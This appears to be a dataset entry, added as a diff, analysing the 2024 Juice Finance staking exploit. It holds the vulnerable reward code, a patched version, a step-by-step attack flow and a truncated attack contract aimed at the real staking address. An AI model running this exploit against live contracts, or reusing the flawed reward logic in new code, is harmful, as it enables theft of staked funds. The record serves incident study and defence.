@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-03-XX_Juice_StakingRewardLogicFlaw",
+ "source_file": "2024/2024-03-XX_Juice_StakingRewardLogicFlaw.md",
+ "title": "Juice — Staking Instant Reward Claiming Logic Flaw Analysis",
+ "date": "2024-03-01",
+ "protocol": "Juice Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~54 ETH",
+ "loss_usd": null,
+ "root_cause": "Reward calculation logic flaw allowing disproportionately large rewards to be claimed via `harvest()` after just 1 block following `stake()`",
+ "attack_tx": null,
+ "vulnerable_contract": "Stake 0x8584ddbd",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: allows bulk reward claiming immediately after staking\ninterface IStake {\n    function stake(uint256 amount, uint256 lockDuration) external;\n    function harvest(uint256 stakeId) external;\n}\n\n// Internal reward calculation logic:\n// reward = amount * lockDuration * rewardRate / PRECISION\n// Setting lockDuration extremely high enables immediate bulk reward calculation\n// No validation of reward payout timing (harvest possible after 1 block)\n\nfunction harvest(uint256 stakeId) external {\n    StakeInfo storage info = stakes[msg.sender][stakeId];\n    uint256 reward = calculateReward(info);  // Calculated immediately based on lockDuration\n    // No minimum staking duration check\n    rewardToken.transfer(msg.sender, reward);\n    delete stakes[msg.sender][stakeId];\n}\n\n//",
+  "// File: JuiceStaking.sol\n\tfunction stake(uint256 amount, uint256 stakeWeek) external {  // ❌ Vulnerability\n\t    require(IERC20(Juice).balanceOf(address(msg.sender)) >= amount, \"Balance not available for staking\");\n\t\trequire(stakeWeek > 0, \"stakeWeek must be greater than or equal to one\");\n\t\trequire(stakingStartTime > 0, \"Staking is not started yet\");\n\t\trequire(stakingEndTime > block.timestamp, \"Staking is closed\");\n\t\t\n\t\t_updatePool();\n\t\t\n\t\tuint256 stakeCount = stakingCount[address(msg.sender)];\n\t\t\n\t\tIERC20(Juice).safeTransferFrom(address(msg.sender), address(this), amount);\n\t\tJuiceStaked += amount;\n\t\tstakingCount[address(msg.sender)] += 1;\n\t\t\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].stakedAmount = amount;\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].startTime = block.timestamp;\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].endTime = block.timestamp + (stakeWeek * 7 days);\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].stakingWeek = stakeWeek;\n\t\tmapStakingInfo[address(msg.sender)][stakeCount].rewardDebt = (amount * rewardPerShare) / precisionFactor;\n        emit Stake(address(msg.sender), amount);\n    }"
+ ],
+ "code_after": [
+  "✅ Safe code: minimum staking duration + reward cap\nuint256 public constant MIN_STAKE_DURATION = 7 days;\nuint256 public constant MAX_REWARD_PER_STAKE = 10 ether;\n\nfunction harvest(uint256 stakeId) external {\n    StakeInfo storage info = stakes[msg.sender][stakeId];\n    require(\n        block.timestamp >= info.startTime + MIN_STAKE_DURATION,\n        \"too early\"\n    );\n    uint256 reward = min(calculateReward(info), MAX_REWARD_PER_STAKE);\n    rewardToken.transfer(msg.sender, reward);\n    delete stakes[msg.sender][stakeId];\n}"
+ ],
+ "steps": [
+  "→ [1] 0.5 ETH → JUICE swap (Uniswap V2)",
+  "→ [2] stake(juiceAmount, 3_000_000_000)",
+  "→ [3] Wait 1 block + 12 seconds",
+  "→ [4] harvest(stakeId)",
+  "→ [5] JUICE → ETH swap",
+  "→ [6] ~54 ETH profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] 0.5 ETH → JUICE swap (Uniswap V2)\n  │\n  ├─→ [2] stake(juiceAmount, 3_000_000_000)\n  │         └─ Maximize reward multiplier with extremely large lockDuration\n  │\n  ├─→ [3] Wait 1 block + 12 seconds\n  │\n  ├─→ [4] harvest(stakeId)\n  │         └─ Instantly claim bulk rewards based on lockDuration\n  │\n  ├─→ [5] JUICE → ETH swap\n  │\n  └─→ [6] ~54 ETH profit",
+  "interface IStake {\n    function stake(uint256 amount, uint256 lockDuration) external;\n    function harvest(uint256 stakeId) external;\n}\n\ncontract AttackContract {\n    IStake    constant staking = IStake(0x8584ddbd1e28bca4bc6fb96bafe39f850301940e);\n    IERC20    constant JUICE   = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);\n    IUniRouter constant router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n    function testExploit() external payable {\n        // [1] ETH → JUICE swap\n        swapETHToJUICE(0.5 ether);\n\n        uint256 juiceBalance = JUICE.balanceOf(address(this));\n        JUICE.approve(address(staking), juiceBalance);\n\n        // [2] Stake with extremely large lockDuration (maximize reward multiplier)\n        staking.stake(juiceBalance, 3_000_000_000);\n\n       "
+ ]
+}
